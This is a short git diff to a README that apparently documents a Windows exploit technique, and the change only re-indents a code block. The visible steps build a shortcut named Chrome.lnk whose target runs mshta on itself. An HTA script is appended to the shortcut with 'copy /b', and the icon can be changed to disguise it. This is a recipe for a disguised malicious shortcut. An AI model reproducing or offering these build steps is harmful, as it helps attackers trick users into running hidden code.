@@ -15,12 +15,12 @@ Tested on Windows 11
   </script>
   ```
 * 3- On exploit shortcut, change proprieties:
-```
-Target: cmd /c mshta %CD%\Chrome.lnk
-Start In: C:\Users\<your-user>\Desktop
-
-And change icon if you desire
-```
+  ```
+  Target: cmd /c mshta %CD%\Chrome.lnk
+  Start In: C:\Users\<your-user>\Desktop
+  
+  And change icon if you desire
+  ```
 * 3- To build: On cmd:
   ```
   copy /b C:\Users\<your-user>\Desktop\exploit.lnk+code.hta Chrome.lnk
